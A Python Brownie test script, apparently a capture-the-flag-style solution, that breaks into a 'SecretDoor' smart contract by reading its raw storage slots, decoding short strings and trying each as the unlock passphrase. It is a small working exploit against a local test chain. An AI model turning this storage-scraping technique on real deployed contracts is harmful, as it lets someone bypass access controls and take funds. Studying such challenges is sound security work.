from web3 import Web3
from brownie import Contract,accounts, chain
import json

#@pytest.fixture
def test_successfull_minting_tests():
    green ='\x1b[0;32m'
    red='\x1b[0;31m'
    nocolor='\x1b[0;m'
    print(chain[-1].number)

    muggle = accounts.add()

    w3 = Web3(Web3.HTTPProvider())
    #2.5 ETH (ETH -> WEI -> Hexdecimal)
    w3.provider.make_request("evm_setAccountBalance", [muggle.address, "0x22B1C8C1227A0000" ])

    #0x22B1C8C1227A0000 is equal to 2.5 ETH
    SECRET_DOOR_ADDRESS = "0x148f340701D3Ff95c7aA0491f5497709861Ca27D"
    SECRET_DOOR_ABI = json.loads(open('/Users/m4ud/Desktop/SCH/test/SecretDoorABI.json').read())  

    secretDoor= Contract.from_abi(name="uniswapRouter", address=SECRET_DOOR_ADDRESS, abi=SECRET_DOOR_ABI)
    text='EatSlugs'
    passphrase = Web3.toHex(Web3.toBytes(text=text).ljust(32, b'\0'))
    secretDoor.unlockDoor(passphrase, {'from': muggle, "gas_price": '20 gwei'}).wait(1)
    #print("muggle address", dir(secretDoor))
    owner=secretDoor.owner()

    for i in range(0, 10):
       
        x = w3.eth.getStorageAt(secretDoor.address, i)
        # strip empty lines
        xx = x.strip(b'\x00').strip(b'\x01').strip(b'\x07')
        j = xx.decode("latin-1").strip(" ").lstrip(" ")
        if len(j) ==20:

            if owner == Web3.toHex(Web3.toBytes(xx)):
            # if finds a 20 bytes string it is an address, so we convert the address to hex and print it
                print("Owner Address found:",Web3.toHex(Web3.toBytes(xx)),"at storage: ",i)
        if len(j) < 15 and len(j) > 0:
            print(str(j).encode('utf-8'),"at storage: ",i, "lentgh: ", len(j))
            print("Trying to breaking in with passphrase:",j,"at storage: ",i)
            passphrase = Web3.toHex(Web3.toBytes(text=j).ljust(32, b'\0'))
            secretDoor.unlockDoor(passphrase, {'from': muggle, "gas_price": '20 gwei'}).wait(1)
            f = secretDoor.isLocked({'from': muggle})
            if f == True:
                red='\x1b[0;31m'
                print("\r\n",red,"\rFailed:\x1b[0m pass:",j, red,"\rLocked","\x1b[0m\r\n")
            if f == False:
                green ='\x1b[0;32m'
                print("\r\n",green,"\rSuccess:\x1b[0m pass:",j ,green,"\rUnlocked","\x1b[0m\r\n")
                assert(secretDoor.isLocked({'from': muggle}) == False)
                break
